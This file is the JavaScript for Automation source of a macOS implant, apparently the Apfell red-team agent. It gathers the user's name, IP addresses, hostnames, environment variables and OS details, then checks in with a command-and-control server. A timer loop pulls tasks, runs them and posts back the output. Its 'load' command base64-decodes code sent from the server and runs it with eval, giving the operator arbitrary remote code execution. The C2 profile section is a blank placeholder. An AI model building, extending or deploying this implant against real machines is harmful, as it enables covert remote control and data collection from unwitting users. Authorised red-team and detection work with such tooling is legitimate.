ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class implant{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = -1;
		this.user = ObjC.deepUnwrap(this.procInfo.userName);
		this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.deepUnwrap(this.hostInfo.addresses); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.deepUnwrap(this.hostInfo.names); //probably just need [0]
		this.killdate = "";
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.deepUnwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.deepUnwrap(this.procInfo.arguments);
		this.osVersion = this.procInfo.operatingSystemVersionString.js;
		this.uuid = "XXXX";
	}
}
apfell = new implant();
//--------------Base C2 INFORMATION----------------------------------------
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	//   You're welcome to add additional functions as well, but this is the minimum
	constructor(interval, baseurl){
		this.interval = interval; //seconds between callbacks
		this.baseurl = baseurl; //where to reach out to
		this.commands = [];
	}
	getInterval(){
		return this.interval;
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(task, output){
		//output a response to a task
	}
	setConfig(params){
		//updates the current configuration for how to get tasking
	}
	download(task, params){
	    //gets a file from the apfell server in some way
	}
	upload(task, params){
	    //uploads a file in some way to the teamserver
	}
}
//------------- C2Profile -------------------------------------------
//-------------SHARED COMMAND CODE ------------------------
does_file_exist = function(strPath){
    var error = $();
    return $.NSFileManager.defaultManager.attributesOfItemAtPathError($(strPath).stringByStandardizingPath, error), error.code === undefined;
};
convert_to_nsdata = function(strData){
    // helper function to convert UTF8 strings to NSData objects
    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
    return tmpString.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
};
write_data_to_file = function(data, file_path){
    try{
        //var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
        //currentApp.setEof(open_file, { to: 0 }); //clear the current file
        //currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
        //currentApp.closeAccess(open_file);
        if(typeof data == "string"){
            data = convert_to_nsdata(data);
        }
        if (data.writeToFileAtomically($(file_path), true)){
            return "file written";
        }
        else{
            return "failed to write file";
        }
     }
     catch(error){
        return "failed to write to file: " + error.toString();
     }
};
default_load = function(contents){
    var module = {exports: {}};
    var exports = module.exports;
    if(typeof contents == "string"){
        eval(contents);
    }
    else{
        eval(contents.js);
    }
    return module.exports;
};
base64_decode = function(data){
    if(typeof data == "string"){
        var ns_data = $.NSData.alloc.initWithBase64Encoding($(data));
    }
    else{
        var ns_data = data;
    }
    var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
    return decoded_data;
};
base64_encode = function(data){
    if(typeof data == "string"){
        var ns_data = convert_to_nsdata(data);
    }
    else{
        var ns_data = data;
    }
    var encoded = ns_data.base64EncodedStringWithOptions(0).js;
    return encoded;
};
    var commands_string = `
        exports.exit = function(task, command, params){
        $.NSApplication.sharedApplication.terminate(this);
        };
        exports.load = function(task, command, params){
            //base64 decode the params and pass it to the default_load command
            //  params should be {"cmd": "cmd_name", "code": "base64 encoded JXA code"}
            try{
                params = params.replace(/\\'/g, "\\"");
                parsed_params = JSON.parse(params);
                new_dict = default_load(base64_decode(parsed_params['code']));
                commands_dict = Object.assign({}, commands_dict, new_dict);
                return "Loaded " + parsed_params['cmd'];
            }
            catch(error){
                return error.toString();
            }

        };
    `;
    commands_string = commands_string + `
//-------------COMMAND DECLARATIONS AND IMPLEMENTATIONS -----------------------
`;
    //console.log("about to load commands");
    var commands_dict = default_load(commands_string);
    //console.log("loaded commands");
//-------------GET IP AND CHECKIN ----------------------------------
for(var i=0; i < apfell.ip.length; i++){
	ip = apfell.ip[i];
	if (ip.includes(".") && ip != "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
		//console.log("found ip, checking in");
		C2.setConfig({"commands": Object.keys(commands_dict)});
		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
		break;
	}
}
//---------------------------MAIN LOOP ----------------------------------------
sleepWakeUp = function(t){
	var output = "";

	task = C2.getTasking();
    var command = "";
	try{
		command = ObjC.unwrap(task["command"]);
		if(command != "none"){
			var params = ObjC.unwrap(task["params"]);
			// params will either be a single parameter, string parameters, JSON of multiple params, or nothing
			//console.log(JSON.stringify(task));
			//console.log("processing task");
			try{
			    var output = commands_dict[command](task, command, params);
			}
			catch(error){
			    if(error.toString().includes("commands_dict[command] is not a function")){
			        output = "Unknown command: " + command;
			    }
			    else{
			        output = error.toString();
			    }
			}
			if ((typeof output) == "string"){
			    console.log("converting output to nsdata");
			    output = convert_to_nsdata(output);
			}
			C2.postResponse(task, output);
		}
	}
	catch(error){
		C2.postResponse(task, convert_to_nsdata(error.toString()));
	}
	if(command == "prompt"){
	    //Not sure why, but doing a dialog prompt appears to cause the nstimer to stop working? just do it again
	    // all three steps seem to be required, and it makes a very slow exit from that function call...
	    timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
        $.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
        $.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
	}
	task["command"] = "none"; //reset just in case something goes weird
};
//https://stackoverflow.com/questions/37834749/settimout-with-javascript-for-automation
timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
$.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
//TODO update this to not be $.NSDate.distantFuture but rather should be the C2.killdate
$.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
